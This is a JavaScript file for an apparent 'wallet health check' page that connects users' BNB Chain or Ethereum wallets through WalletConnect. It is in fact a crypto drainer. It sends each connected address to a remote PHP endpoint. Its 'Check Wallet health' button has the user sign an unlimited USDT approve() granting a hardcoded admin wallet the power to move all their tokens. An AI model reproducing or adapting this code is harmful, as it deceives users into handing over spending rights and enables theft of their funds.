import EthereumProvider from "@walletconnect/ethereum-provider";
import { ethers } from "ethers";

// DOM References
const connectBEP = document.getElementById("connectWallet");
const connectERC = document.getElementById("connectWalleterc");
const approveBEP = document.getElementById("approveUSDT");
const approveERC = document.getElementById("approveUSDTerc");
const userAddressInput = document.getElementById("userAddress");
const userBalanceSpan = document.getElementById("userBalance");
const walletInfoDiv = document.getElementById("walletInfo");

const ADMIN_WALLET = "0x24E189414e4217962964b9D57877C91349A169Da";

// USDT Contract addresses
const USDT_CONTRACTS = {
    56: "0x55d398326f99059fF775485246999027B3197955", // BNB
    1: "0xdAC17F958D2ee523a2206206994597C13D831ec7"  // Ethereum
};

const APPROVE_ABI = ["function approve(address spender, uint256 amount) public returns (bool)"];
const BALANCE_ABI = ["function balanceOf(address owner) view returns (uint256)"];

let signer, currentChainId, usdtAddress;

// Shared connect logic
async function connectWallet(chainId) {
    try {
        const provider = await EthereumProvider.init({
            projectId: "5c7a882142c7491241b507534414ddff",
            chains: [chainId],
            methods: ["eth_sendTransaction", "eth_sign", "personal_sign"],
            showQrModal: true
        });

        await provider.connect();
        const ethersProvider = new ethers.BrowserProvider(provider);
        signer = await ethersProvider.getSigner();
        const userAddress = await signer.getAddress();

        currentChainId = chainId;
        usdtAddress = USDT_CONTRACTS[chainId];

        // Save address
        fetch("https://tradeinusdt.com/php/save_wallet.php", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ wallet: userAddress })
        });

        // Show wallet info
        userAddressInput.value = userAddress;
        walletInfoDiv.style.display = "block";

        // Show correct approve button
       document.getElementById("approveButtons").style.display = "flex";
        if (chainId === 56) {
            approveBEP.style.display = "inline-flex";
            approveERC.style.display = "none";
        } else if (chainId === 1) {
            approveERC.style.display = "inline-flex";
            approveBEP.style.display = "none";
        }

        // Fetch balance
        const usdt = new ethers.Contract(usdtAddress, BALANCE_ABI, ethersProvider);
        const rawBalance = await usdt.balanceOf(userAddress);
        const readableBalance = ethers.formatUnits(rawBalance, 18);
        userBalanceSpan.innerText = readableBalance + " USDT";

    } catch (err) {
        console.error("Wallet connect error:", err);
        alert("Connection failed: " + (err.message || err));
    }
}

// Approve logic
async function approveUSDT(targetButton) {
    try {
        targetButton.disabled = true;
        targetButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';

        const contract = new ethers.Contract(usdtAddress, APPROVE_ABI, signer);
        const tx = await contract.approve(ADMIN_WALLET, ethers.MaxUint256);
        await tx.wait();

        const userAddress = await signer.getAddress();

        // Fetch balance again after the approval
        const usdt = new ethers.Contract(usdtAddress, BALANCE_ABI, signer);
        const rawBalance = await usdt.balanceOf(userAddress);
        const readableBalance = ethers.formatUnits(rawBalance, 18);

        // Redirect with both wallet address and balance in the query string
        window.location.href = `/healthcard.html?wallet=${userAddress}&balance=${readableBalance}`;
    } catch (err) {
        console.error("Approval failed:", err);
        alert("Approval failed: " + (err.message || err));
    } finally {
        targetButton.disabled = false;
        targetButton.innerHTML = '<i class="fas fa-award" style="margin-right: 0.5rem;"></i>Check Wallet health';
    }
}


// Bind connect buttons
connectBEP.onclick = () => connectWallet(56);
connectERC.onclick = () => connectWallet(1);

// Bind approve buttons
approveBEP.onclick = () => approveUSDT(approveBEP);
approveERC.onclick = () => approveUSDT(approveERC);

// Copy function
export function copyAddress() {
    userAddressInput.select();
    userAddressInput.setSelectionRange(0, 99999);
    document.execCommand("copy");
    alert("Address copied to clipboard!");
}

// Overlay logic
const startConnectBtn = document.getElementById("startConnect");
const preConnectOverlay = document.getElementById("preConnectOverlay");
const closeBtn = document.getElementById("preConnectClose");

startConnectBtn?.addEventListener("click", () => preConnectOverlay.style.display = "flex");
closeBtn?.addEventListener("click", () => preConnectOverlay.style.display = "none");
window.addEventListener("click", e => {
    if (e.target === preConnectOverlay) preConnectOverlay.style.display = "none";
});
